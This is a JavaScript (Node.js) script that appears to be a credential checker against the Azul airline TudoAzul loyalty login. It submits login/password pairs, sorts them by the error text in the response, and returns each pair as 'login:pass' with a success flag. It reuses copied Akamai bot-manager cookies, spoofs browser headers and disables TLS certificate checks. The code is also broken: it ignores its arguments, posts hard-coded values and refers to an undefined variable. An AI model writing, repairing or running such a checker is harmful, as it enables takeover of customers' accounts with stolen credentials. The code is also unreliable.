import axios from 'axios';

import { writeFileSync } from "fs";
import https from 'https';


const headers = {
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  'Cache-Control': 'max-age=0',
  'Connection': 'keep-alive',
  // 'Cookie': 'ASP.NET_SessionId=3zziq1gvy4eqezgkz0ompkpo; ComarchToken=; ad_gdpr=0; ak_bmsc=3ECC3D0219D60AEE6506681FD53AC65C~000000000000000000000000000000~YAAQQoQUAlz/GemSAQAAA9Ns9BlxIZIv3Eh7bYM1h+nJ5ZU4ie2I7SQlDTT0/h4UD+6PaxTf0Msv176W7Ll2VSzaLRbCHloTpZZdawJrWL0HViEt2Hqh8rm7YYO/Nnp2Bqe9whL2TEs+uHilYNVmaRG6iKtWYW15KvoLvRQk+MvpQMARQr4tsl1qQcfSFFHih5Sl8WSZwh6hg9kmaiq+Wb2QsOYndSRjZ8+BO1pLRoH1W4Z3Om1cFzW7fdV/VPDrzgpwI0xej23hwxBSkc5XMaqRELEhTq21Sjl/DZ1k8oJu5vdY1dWWjKsI5YuYE1Ob5FrsH1hHdWXKl1VGSS1yKYID47r2vbIwqTD3Fjh+9+BZK39zCbT4c98Nrholh8cySk4++eZQShcVCX5x3ferRvti6O/QfMXZH6NvJQjZlMhqiNsKOZQy0ldtU/5TR/GjgbVKJP5u6HaRciSd5xoyV+qfdmwqdkR0i/vGHKHJ; JTtoHgLAtV=!sSgZSUEGAVw7MIcRvzS7PtWCnlxVmkJ0e9nKevS/ZQqD7R878aeutsu8ICvzRtooLbcLh5sD2dNWDQ==; bm_ss=ab8e18ef4e; bm_s=YAAQR4QUAludg+mSAQAAA6tt9ALjwJaUsytXj/kipE8VXdai+02bIdDiiVH/QB5dmMEA1iB7nEIc7v7q55iHLvbsdcnYkLeXOv9m/BMraSDA0SqepRuwwiaiEcqaTnlg4sVWKSStl9YNCcWioNZh2XPhbAmCqClXSJOYWGODJN8amWZxfLrT+DjdH4snNdzWMwGl+VH6K4Y0l+cUBcYZ3iKp0nzkEkwAvF1NGGOQfsJGkNJYD1Jx2Q4+fsVj3Kxcd2Tinh7SEMjel6zqDSu/Fc9Z9kjup5EC+dp5Y7f0yEubLn6zp3+O0j0KZ18IjilyENC+ZbEe1xfiuultJOmv2AkdeWx+RRgHvAs=; bm_sv=7800F4F4D3ED1E2176E7B89F5AAD5AE4~YAAQR4QUAlydg+mSAQAAA6tt9Bm/E7b3x5RN880zdyRbo/UZP6jddujBkoLZFhQ0hocpMH//AGHvj+UggLcdOe7mRNI7QR/sZzDETt4Aeisp48lPzk8+/ptGZFtW5QOcSW+WyuJ8E9kOSkl112O3nTg2FISwT3RpeCrHkzIWt5hkK/o7oKBz1Ylp9Sn26ZT4StqmKP2By8+xdMuC5mEJpsr2xIea+eSJChGu2ICX6KAHSwzDHrPngWLHfEigKWU9sagSAw==~1; bm_sz=98A62F5896EE02926101C551ADAF9CEE~YAAQR4QUAl2dg+mSAQAAA6tt9BnC6rteCG2btCzk49D4rQhf4EGdCvjQCyIDVY6r4HdXmriqu7LOJIxnt1GIo24q9djcN2kjvucQS2EdzY7we0BUN/LT1FdcEoLXCsdYZUU7jqqJMwmHe3bllPK52TWkPrMngjho2dzDXp3PkBFOJEX2NOyC+Fl2gQuQprELzZQglHNl55clRgJ6j6fc1VKHdEXkn2/Inper6DPKkWwxpxcDMHUMyEL6zUKJVejUoq1Xi1ZFVLW7gI0n2gQiWEHMYfXXAd5t20LgomOfEGaT1x3mB/niOAm6xihpZzgxvxWUU6VARAcZyFpv03L1aSSu+DRDFUaoswfNSeZMiBJfy29DlM799/IapvIV4kG+3SJQbFCP7nGNuMiTMj0V9atnTXCQFWpDvlOoaeNFritNndBziy/b~3421747~3360056; _abck=5E53A9FC806CBB7BBC341E3E2C73DD47~-1~YAAQQoQUAq/KHOmSAQAAmsBy9AxeHcGmp1UIlN2IXAmE9AMwcGAIgEbGi4dtKCBRD8HE9oZX48wmxoXWxlMnjERbnXpC+AJ+XCtXoF3jXzYtxdMfgYJWoUMDDtFIB/5EHyNczFmbUVE8Eip/+jMAO4Xd/ob92lDscY/SYHA2mGhkUC1fEAM39QzERKnA45A2s6JQYtZuqUyW8845+M9Xd4pNhvHU3/5jSFGJuHWnE/2dOUazP4aelmT/cXnCUHg7EtZ3+ZVg19aZ7pnm6KcbYkKcmkxlkjgVeOnl13GAEWZ8VmTG0F1h5elEopjIdXCFQPsDvMC8FwcA4HqE6HQcFO6H11aDI9oDvGuKTvvITDyklFjP//zbgFKrLiGhMGBZwyJEX7io0N5EVTZetpDT2qTRypEs/9jWlhNXukbhJShubTI2q/pT1SJn7taDJK2x351SB8C+PdJ9cdvxsSP7vfpJJUvZ5KYVHeUotvi2TAVy2RjaSq/IDOMzRfeAWe5XW10Df3aVxcy4EmEz6YVH2T+FA50WSCM3WbPU6FO3xUIzanE5KZ9rHfbLEUhymbg1g55FhZnbNWCG0bNXS4pJxk/ZUdipZDgrl86NX3YmYKCaMoHRNpZnZ3PVhfj6fYlygX3Pn9/1rYsS614tOHGD4DK0RpIG9Gm35So/zLHQfXYJBI61ksmwSUkLZT6hfn5UxfTzvyof5LyyjG2HH1DVDGvNsOgWwQugatYRa9HJyLulZbZ5MFF6t0p1hwSump+ga5RmF3X72wwadMTMN1cqfBzSy4NZO8aoRo2zqcZmstsjBmKCMoeGK2RNKFNPHjgPDFPjbgs=~-1~-1~-1; RT="z=1&dm=apps.voeazul.com.br&si=5f28098d-735b-48c2-a835-aac9dda8bad3&ss=m328swmh&sl=1&rl=1&tt=9t4&ld=9tb&nu=3y6a2q7y&cl=76ib&ul=76j9"',
  'Origin': 'https://apps.voeazul.com.br',
  'Referer': 'https://apps.voeazul.com.br/TudoAzulRenew/',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-User': '?1',
  'Upgrade-Insecure-Requests': '1',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"'
}

async function voeAzul(login, pass) {

    const getCookies = await axios({
      url:'http://apps.voeazul.com.br/TudoAzulRenew/',
      method:'GET',
      httpsAgent: new https.Agent({  
          rejectUnauthorized: false 
      })

});
    headers.Cookie = getCookies.headers?.['set-cookie'];
    console.log(getCookies.headers);
    
    const { data } = await axios.post(
        'https://apps.voeazul.com.br/TudoAzulRenew/',
        new URLSearchParams({
          'agentName': '94679357754',
          'password': 'qweasdasdasdas'
        }),
        {
          headers: headers,
          validateStatus: () => true,
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false 
    })
}
);

  
  if (data.includes('Erro na transação'))
    return {
      success: false,
      login: login + ":" + pass,
      uri: url,
    };

  return {
    success: true,
    login: login + ":" + pass,
    uri: url,
  };
}

console.log(await voeAzul("14679357754", "dadsasda"))